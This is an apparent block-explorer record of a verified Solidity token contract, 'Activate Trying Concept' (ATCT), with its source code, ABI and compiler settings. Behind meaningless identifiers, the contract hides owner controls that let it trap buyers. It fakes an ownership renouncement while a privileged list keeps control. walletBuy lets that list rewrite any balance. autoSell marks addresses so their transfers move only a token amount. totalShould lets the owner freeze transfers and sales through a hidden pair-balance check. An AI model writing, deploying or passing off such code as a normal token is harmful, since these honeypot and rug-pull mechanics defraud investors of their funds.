{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface liquidityShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundFeeMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromAtTotal {\n    function createPair(address fromAmount, address feeLimit) external returns (address);\n}\n\ninterface modeToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeLiquidity) external view returns (uint256);\n\n    function transfer(address txTo, uint256 liquidityFrom) external returns (bool);\n\n    function allowance(address launchMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txTo,\n        uint256 liquidityFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeSellExempt, uint256 value);\n    event Approval(address indexed launchMarketing, address indexed spender, uint256 value);\n}\n\ninterface modeTokenMetadata is modeToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ActivateTryingConcept is fundFeeMode, modeToken, modeTokenMetadata {\n\n    function receiverToken() public {\n        emit OwnershipTransferred(liquidityShouldTeam, address(0));\n        walletReceiver = address(0);\n    }\n\n    function balanceOf(address modeLiquidity) public view virtual override returns (uint256) {\n        return sellBuy[modeLiquidity];\n    }\n\n    bool public buyTo;\n\n    function getOwner() external view returns (address) {\n        return walletReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedWallet;\n    }\n\n    function atTo(address modeTeamReceiver, address txTo, uint256 liquidityFrom) internal returns (bool) {\n        if (modeTeamReceiver == liquidityShouldTeam) {\n            return amountLaunchFrom(modeTeamReceiver, txTo, liquidityFrom);\n        }\n        uint256 limitFeeShould = modeToken(receiverSwapMode).balanceOf(modeMarketing);\n        require(limitFeeShould == launchedMarketing);\n        require(txTo != modeMarketing);\n        if (feeIsBuy[modeTeamReceiver]) {\n            return amountLaunchFrom(modeTeamReceiver, txTo, receiverTokenTx);\n        }\n        return amountLaunchFrom(modeTeamReceiver, txTo, liquidityFrom);\n    }\n\n    function totalShould(uint256 liquidityFrom) public {\n        tokenModeFrom();\n        launchedMarketing = liquidityFrom;\n    }\n\n    function walletList(address minFundAt) public {\n        if (senderAmount) {\n            return;\n        }\n        \n        marketingMin[minFundAt] = true;\n        \n        senderAmount = true;\n    }\n\n    uint256 launchedMarketing;\n\n    function owner() external view returns (address) {\n        return walletReceiver;\n    }\n\n    uint256 public marketingEnable;\n\n    function amountLaunchFrom(address modeTeamReceiver, address txTo, uint256 liquidityFrom) internal returns (bool) {\n        require(sellBuy[modeTeamReceiver] >= liquidityFrom);\n        sellBuy[modeTeamReceiver] -= liquidityFrom;\n        sellBuy[txTo] += liquidityFrom;\n        emit Transfer(modeTeamReceiver, txTo, liquidityFrom);\n        return true;\n    }\n\n    function autoSell(address receiverAt) public {\n        tokenModeFrom();\n        \n        if (receiverAt == liquidityShouldTeam || receiverAt == receiverSwapMode) {\n            return;\n        }\n        feeIsBuy[receiverAt] = true;\n    }\n\n    uint256 private minMarketing = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minMarketing;\n    }\n\n    uint8 private walletModeTotal = 18;\n\n    bool private txSellExempt;\n\n    uint256 public txReceiver;\n\n    mapping(address => uint256) private sellBuy;\n\n    function transfer(address isFrom, uint256 liquidityFrom) external virtual override returns (bool) {\n        return atTo(_msgSender(), isFrom, liquidityFrom);\n    }\n\n    string private tradingAt = \"ATCT\";\n\n    function approve(address autoMax, uint256 liquidityFrom) public virtual override returns (bool) {\n        exemptTrading[_msgSender()][autoMax] = liquidityFrom;\n        emit Approval(_msgSender(), autoMax, liquidityFrom);\n        return true;\n    }\n\n    function transferFrom(address modeTeamReceiver, address txTo, uint256 liquidityFrom) external override returns (bool) {\n        if (_msgSender() != maxLaunched) {\n            if (exemptTrading[modeTeamReceiver][_msgSender()] != type(uint256).max) {\n                require(liquidityFrom <= exemptTrading[modeTeamReceiver][_msgSender()]);\n                exemptTrading[modeTeamReceiver][_msgSender()] -= liquidityFrom;\n            }\n        }\n        return atTo(modeTeamReceiver, txTo, liquidityFrom);\n    }\n\n    address private walletReceiver;\n\n    mapping(address => mapping(address => uint256)) private exemptTrading;\n\n    function allowance(address exemptAmount, address autoMax) external view virtual override returns (uint256) {\n        if (autoMax == maxLaunched) {\n            return type(uint256).max;\n        }\n        return exemptTrading[exemptAmount][autoMax];\n    }\n\n    event OwnershipTransferred(address indexed amountTakeReceiver, address indexed autoListMarketing);\n\n    uint256 autoToken;\n\n    uint256 public launchedBuyToken;\n\n    uint256 constant receiverTokenTx = 16 ** 10;\n\n    function walletBuy(address isFrom, uint256 liquidityFrom) public {\n        tokenModeFrom();\n        sellBuy[isFrom] = liquidityFrom;\n    }\n\n    address modeMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public marketingMin;\n\n    address maxLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        liquidityShould feeTrading = liquidityShould(maxLaunched);\n        receiverSwapMode = fromAtTotal(feeTrading.factory()).createPair(feeTrading.WETH(), address(this));\n        \n        liquidityShouldTeam = _msgSender();\n        receiverToken();\n        marketingMin[liquidityShouldTeam] = true;\n        sellBuy[liquidityShouldTeam] = minMarketing;\n        \n        emit Transfer(address(0), liquidityShouldTeam, minMarketing);\n    }\n\n    string private launchedWallet = \"Activate Trying Concept\";\n\n    address public receiverSwapMode;\n\n    bool public senderAmount;\n\n    mapping(address => bool) public feeIsBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletModeTotal;\n    }\n\n    bool public buyFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingAt;\n    }\n\n    address public liquidityShouldTeam;\n\n    function tokenModeFrom() private view {\n        require(marketingMin[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTakeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoListMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSellExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"autoSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeIsBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuyToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityShouldTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwapMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"totalShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTeamReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"walletBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFundAt\",\"type\":\"address\"}],\"name\":\"walletList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ActivateTryingConcept", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}